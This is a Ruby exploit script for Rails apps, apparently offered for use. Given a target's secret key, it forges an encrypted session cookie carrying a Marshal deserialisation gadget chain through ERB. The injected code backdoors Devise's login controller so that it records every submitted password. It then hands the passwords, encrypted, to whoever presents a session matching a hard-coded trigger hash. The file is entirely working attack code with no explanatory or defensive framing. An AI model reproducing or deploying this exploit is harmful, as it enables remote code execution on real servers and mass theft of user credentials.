require 'active_support'
require 'base64'
str1 = <<STR1
Devise::SessionsController.class_eval <<DEVISE 
@@passwordsgohere = []
@@target_model = nil
@@triggerword = "22bce2630cb45cbff19490371d19a654b01ee537"
@@secret = "12IO0nCNPFhWz7a56rmhkiIQ8BOgbUw7yIYl++jYNkxAseBT3Q02N+CwShuqDBqY"
def logallthepasswords
  @@target_model= @@target_model || ActiveRecord::Base.subclasses.collect {|c| c if c.methods.include? :devise }.first.model_name.param_key
  if params[@@target_model] 
    @@passwordsgohere<< params[@@target_model]
  end
end
def leakallthepasswords
   keygen = ActiveSupport::KeyGenerator.new(@@secret,{:iterations => 1337})
   enckey = keygen.generate_key('encrypted hacker')
   sigkey = keygen.generate_key('signed encrypted hacker')
   crypter = ActiveSupport::MessageEncryptor.new(enckey, sigkey,{:serializer => ActiveSupport::MessageEncryptor::NullSerializer })

   if Digest::SHA1.hexdigest(session["session_id"].to_s) == @@triggerword
     render :text => crypter.encrypt_and_sign(JSON.dump(@@passwordsgohere))
     @@passwordsgohere = []
   end
end
before_filter :logallthepasswords
before_filter :leakallthepasswords
DEVISE
{:session_id=>"deadbeef"}
STR1



marshal_payload =
  "\x04\b" +
  "o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\b" +
  ":\x0E@instanceo" +
  ":\bERB\x06" +
  ":\t@src"+ Marshal.dump(str1)[2..-1] + #Marshal.dump(code)[2..-1] +
  ":\f@method:\vresult:" +
  "\x10@deprecatoro:\x1FActiveSupport::Deprecation\x00"


keygen = ActiveSupport::KeyGenerator.new(ARGV[0],{:iterations => 1000})
enckey = keygen.generate_key('encrypted cookie')
sigkey = keygen.generate_key('signed encrypted cookie')
crypter = ActiveSupport::MessageEncryptor.new(enckey, sigkey,{:serializer => ActiveSupport::MessageEncryptor::NullSerializer })
puts crypter.encrypt_and_sign(marshal_payload)
